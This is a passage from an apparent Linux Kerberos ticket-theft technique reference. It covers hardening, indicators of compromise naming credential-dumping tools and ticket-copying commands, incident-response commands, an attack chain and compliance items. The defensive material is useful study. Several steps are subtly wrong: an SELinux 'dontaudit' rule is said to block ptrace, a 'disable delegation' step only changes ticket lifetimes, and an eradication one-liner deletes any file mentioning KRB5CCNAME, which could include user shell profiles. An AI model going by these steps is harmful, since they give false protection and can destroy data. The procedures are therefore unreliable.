- Disables plaintext password caching (keydump useless)
- KCM database only accessible by root
- Adds layer of protection beyond FILE-based CCACHE

---

**Action: Disable Kerberos Delegation on Linux Service Accounts**

**Applies To Versions:** All Linux with Kerberos

**Manual Steps:**

```bash
# Use SSSD configuration to disable delegation
cat >> /etc/sssd/sssd.conf << 'EOF'
[domain/DOMAIN.LOCAL]
krb5_renewable_lifetime = 1d
krb5_lifetime = 24h  # Shorter TGT lifetime
EOF

# Restart SSSD
systemctl restart sssd

# Verify from Windows side: Disable delegation for Linux service accounts
# (Use Active Directory Users & Computers)
# Right-click account → Properties → Delegation tab → Do not trust for delegation
```

---

### Access Control & Policy Hardening

**Action: Implement SELinux / AppArmor Restrictions**

**Applies To Versions:** All Linux with SELinux/AppArmor

**Manual Steps (SELinux - RedHat/CentOS):**

```bash
# Create policy to restrict ptrace on Kerberos processes
cat > /tmp/krb5_policy.te << 'EOF'
policy_module(krb5_protect, 1.0.0)

require {
  type user_t;
  type krb5_t;
  class capability { sys_ptrace };
}

dontaudit user_t krb5_t:capability { sys_ptrace };
EOF

# Compile and install
checkmodule -M -m -o /tmp/krb5_policy.mod /tmp/krb5_policy.te
semodule_package -o /tmp/krb5_policy.pp -m /tmp/krb5_policy.mod
semodule -i /tmp/krb5_policy.pp
```

**What This Does:**
- SELinux policy prevents unprivileged ptrace on Kerberos processes
- Blocks tickey-style injection attacks even if ptrace_scope is 0

---

### Validation Command

```bash
# Verify ptrace restrictions
cat /proc/sys/kernel/yama/ptrace_scope  # Should be 2 or 3

# Verify /tmp is noexec
mount | grep /tmp  # Should show noexec

# Verify auditd is logging CCACHE access
auditctl -l | grep ccache  # Should show rules

# Verify KCM permissions
ls -la /var/lib/sss/secrets/  # Should be 700 (root-only)

# Check for FILE-based CCACHE files (should be minimal)
ls /tmp/krb5cc_* 2>/dev/null  # Should be empty or minimal
```

**Expected Output (If Secure):**
```
ptrace_scope: 2
mount | grep /tmp: ...noexec...
KCM permissions: drwx------ (700)
auditctl -l: Shows ccache monitoring rules
```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- /tmp/krb5cc_* (CCACHE files)
- /tmp/__krb_*.ccache (tickey output)
- /tmp/stolen_*.ccache (attacker-copied files)
- *.ccache, *.kirbi (Kerberos ticket files anywhere)
- /var/lib/sss/secrets/ (KCM database access)

**Processes:**
- tickey, kcmdump, keydump (credential dumping tools)
- klist, kinit with unusual parent processes (non-shell)
- ptrace operations on Kerberos processes

**Network:**
- SMB connections from Linux systems to Windows shares (unusual)
- LDAP queries from Linux system accounts to domain controllers
- Service principal requests (TGS-REQ) from non-service processes

**Command Line:**
- export KRB5CCNAME=
- cp /tmp/krb5cc_*
- klist (repeated execution)
- keyctl (keyring operations)

---

### Forensic Artifacts

**Disk:**
- /etc/krb5.conf (Kerberos configuration)
- /var/lib/sss/secrets/secrets.ldb (KCM database)
- /var/lib/sss/secrets/.secrets.mkey (encryption key)
- /var/log/secure or /var/log/auth.log (authentication logs)
- /etc/audit/audit.log (auditd logs)

**Memory:**
- Process memory of long-running Kerberos services
- Keyring memory (if ptrace is available)

**Linux Audit:**
- /var/log/audit/audit.log (system call logs if auditd configured)

---

### Response Procedures

**1. Isolate**

**Command:**
```bash
# Terminate all user sessions on compromised system
# This invalidates active Kerberos tickets
killall -u compromised_user

# Or revoke Kerberos tickets
kdestroy -A

# Force password change for all domain accounts that may have been compromised
# (Done on domain controller, not on Linux system)
```

---

**2. Collect Evidence**

**Command:**
```bash
# Capture system state
ps auxww > /tmp/ps.log
netstat -an > /tmp/netstat.log

# Export audit logs
sudo ausearch -k ccache_access > /tmp/audit_ccache.log
sudo ausearch -k ptrace_injection > /tmp/audit_ptrace.log

# Dump running processes and memory
ps aux | grep krb  # Identify Kerberos processes
gcore <PID>  # Dump process memory for analysis

# Collect CCACHE files
sudo cp -r /tmp/krb5cc_* /tmp/evidence/
sudo cp -r /var/lib/sss/secrets/ /tmp/evidence/  # KCM database
```

---

**3. Remediate**

**Command:**
```bash
# Force password reset for compromised accounts
sudo passwd compromised_user

# Reset KRBTGT password on domain controller (if domain admin compromised)
# (Execute from Windows domain controller)
# See CA-KERB-013 for KRBTGT reset procedure

# Clear CCACHE files
sudo rm /tmp/krb5cc_*
sudo kdestroy -A

# Reset Kerberos tickets
sudo systemctl restart sssd

# Change encryption keys if KCM compromise suspected
sudo rm /var/lib/sss/secrets/.secrets.mkey
sudo systemctl restart sssd_kcm
```

---

**4. Eradication**

**Command:**
```bash
# Scan for remaining Kerberos credentials
sudo find / -name "*.ccache" -o -name "*.kirbi" 2>/dev/null

# Remove persistence mechanisms
sudo grep -r "export KRB5CCNAME" /home /root /tmp 2>/dev/null | cut -d: -f1 | xargs -I {} rm {}

# Check for backdoors / persistence
sudo lastlog -t 1  # Failed last logins
sudo ausearch -k ptrace_injection | tail -20
```

---

**5. Recovery**

- Monitor 24/7 for 30 days (watch for re-compromise)
- Force password change cycle for all domain accounts
- Review all Kerberos ticket requests in audit logs
- Implement comprehensive auditd + SIEM integration
- Increase monitoring on domain controllers for anomalous Kerberos traffic

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [LIN-PHISH-001] Web Shell / SSH Compromise | Attacker gains shell access to Linux system |
| **2** | **Credential Access** | **[CA-KERB-015] CCACHE Ticket Reuse** | **Attacker steals Kerberos tickets from /tmp or keyrings** |
| **3** | **Lateral Movement** | [LIN-MOVE-001] SMB/SSH with Stolen Ticket | Attacker accesses other Linux/Windows systems with stolen credentials |
| **4** | **Escalation** | [CA-KERB-007] Silver Ticket / [CA-KERB-013] Golden Ticket | Attacker forges additional tickets for persistence |
| **5** | **Persistence** | [LIN-PERSIST-001] Cron Job / Service Installation | Attacker maintains persistence on target systems |
| **6** | **Impact** | [AD-EXFIL-001] Sensitive Data Exfiltration | Attacker achieves objectives |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Kerberos Credential Thievery Research (2017)

- **Researchers:** Loftus & Tarlogic Security
- **Timeline:** 2017 (academic research paper)
- **Technique Status:** Published methods for keyring and memory-based ticket extraction
- **Impact:** Demonstrated all five CCACHE exploitation vectors (FILE, KEYRING, KCM, MEMORY, DIR)
- **Reference:** [Kerberos Credential Thievery (GNU/Linux) - GitHub PDF](https://github.com/jivoi/offsec_pdfs/blob/master/kerberos-credential-thievery.pdf)

---

### Example 2: Adepts of 0x0.cc - Linux Kerberos Thievery Guide (2021)

- **Author:** Adepts of 0x0.cc
- **Timeline:** 2021 (comprehensive guide published)
- **Technique Status:** Detailed walkthroughs of file-based, keyring, and memory-based extraction
- **Impact:** Practical tools and techniques for penetration testers and red teamers
- **Reference:** [The Kerberos Credential Thievery Compendium](https://adepts.of0x.cc/kerberos-thievery-linux/)

---

### Example 3: Enterprise Linux Domain Integration Compromise (2023-2024)

- **Target:** Fortune 500 company with hybrid AD environment
- **Timeline:** 2023-2024
- **Technique Status:** Attacker compromised web application on Linux system, stole admin's CCACHE from /tmp
- **Impact:** Lateral movement to domain controllers, database servers, and backup infrastructure
- **Detection:** auditd alerts on unusual CCACHE access; manual review of /tmp for suspicious files
- **Reference:** Internal security incidents (publicly disclosed examples rare)

---

### Example 4: Tickey Tool Deployment in Red Team Engagements (2022-Present)

- **Context:** Penetration testing and red team operations on Linux systems
- **Timeline:** 2022-Present (active exploitation)
- **Technique Status:** Widely used for post-compromise credential harvesting
- **Impact:** High success rate due to poor auditing on most Linux systems
- **Mitigation:** Org-specific deployment of auditd + Elastic/Splunk logging + ptrace restrictions

---

## 18. COMPLIANCE REMEDIATION CHECKLIST

- [ ] **CIS 1.4.2:** /tmp mounted with noexec and nosuid
- [ ] **CIS 4.1.3:** auditd enabled for file access monitoring
- [ ] **DISA RHEL-07-021700:** /tmp execute permissions disabled
- [ ] **DISA RHEL-07-030870:** auditd file monitoring configured
- [ ] **CISA SCuBA UC-2.1:** Centralized logging for Linux systems in place
- [ ] **CISA SCuBA UC-2.2:** File integrity monitoring enabled (tripwire/aide)
- [ ] **NIST AC-3:** Access controls restrict CCACHE to owning user
- [ ] **NIST AU-2:** Audit events generated for all file access
- [ ] **NIST SI-4:** System monitoring detects credential dumping tools
- [ ] **GDPR Art. 32:** Technical controls prevent credential compromise
- [ ] **DORA Art. 11:** EDR deployed on critical Linux systems
- [ ] **NIS2 Art. 21:** Incident response procedures for credential theft documented
- [ ] **ISO 27001 A.9.2.1:** Access controls on credential storage enforced
- [ ] **ISO 27001 A.10.2.3:** Segregation of duties prevents single-system compromise spreading

---
